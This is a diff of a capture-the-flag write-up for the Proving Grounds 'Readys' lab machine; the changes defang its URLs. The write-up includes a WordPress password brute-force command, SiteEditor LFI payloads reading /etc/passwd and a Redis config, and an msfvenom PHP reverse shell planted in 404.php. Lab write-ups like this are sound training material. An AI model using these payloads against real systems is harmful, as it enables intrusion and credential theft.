@@ -11,17 +11,17 @@ In this entry I will solve PG's Readys machine. It is an Linux machine in the [T
 
 ![c5391e4051b28caa4a2edecf56afeb50.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/c5391e4051b28caa4a2edecf56afeb50.png?raw=true234)
 
-By visiting http://192.168.223.166/ I find wordpress running so I run wpscan.
+By visiting http[:]//192.168.223.166/ I find wordpress running so I run wpscan.
 
 ## Wordpress enumeration
 
-`wpscan -e --url http://192.168.223.166/`
+`wpscan -e --url http[:]//192.168.223.166/`
 
 ![6b16ef438cdc9c202a84aab24c57591c.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/6b16ef438cdc9c202a84aab24c57591c.png?raw=true)
 
 The website discloses the admin user. I try to bruteforce the user runing wpscan
 
-`wpscan -e --url http://192.168.223.166/wp-login.php -U admin -P /usr/share/wordlists/rockyou.txt`
+`wpscan -e --url http[:]//192.168.223.166/wp-login.php -U admin -P /usr/share/wordlists/rockyou.txt`
 
 ## Redis enumeration
 
@@ -39,7 +39,7 @@ Going back to the WordPress site, inspecting the source code I find SiteEditor p
 
 I google for any exploit and I find a possible LFI https://www.exploit-db.com/exploits/44340
 
-`[http://192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax\_shortcode\_pattern.php?ajax_path=/etc/passwd](http://192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax%5C_shortcode%5C_pattern.php?ajax_path=/etc/passwd)`
+`[http[:]//192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax\_shortcode\_pattern.php?ajax_path=/etc/passwd](http[:]//192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax%5C_shortcode%5C_pattern.php?ajax_path=/etc/passwd)`
 
 ![768b40cdbb003c2ea7b4e4fdace55e0e.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/768b40cdbb003c2ea7b4e4fdace55e0e.png?raw=true)
 
@@ -47,7 +47,7 @@ I google for any exploit and I find a possible LFI https://www.exploit-db.com/ex
 
 As redis is running, I try to read redis configuration file, under /etc/redis https://stackoverflow.com/questions/32284494/where-is-the-data-directory-in-redis.
 
-[http://192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax\_shortcode\_pattern.php?ajax_path=/etc/redis/redis.conf](http://192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax%5C_shortcode%5C_pattern.php?ajax_path=/etc/redis/redis.conf)
+[http[:]//192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax\_shortcode\_pattern.php?ajax_path=/etc/redis/redis.conf](http[:]//192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax%5C_shortcode%5C_pattern.php?ajax_path=/etc/redis/redis.conf)
 
 I find a possible username for Redis service
 
@@ -102,7 +102,7 @@ Edit 404.php file and copy [pentestmonkey's reverse shell](https://github.com/pe
 
 msfvenom -p php/reverse_php LHOST=192.168.45.159 LPORT=88 -f raw > reverse.php
 
-Then trigger the exploit by visiting [http://192.168.223.166/wp-content/themes/twentytwenty/404](http://192.168.223.166/wp-content/themes/twentytwenty/404.php)
+Then trigger the exploit by visiting [http[:]//192.168.223.166/wp-content/themes/twentytwenty/404](http[:]//192.168.223.166/wp-content/themes/twentytwenty/404.php)
 
 # Privilege Escalation
 
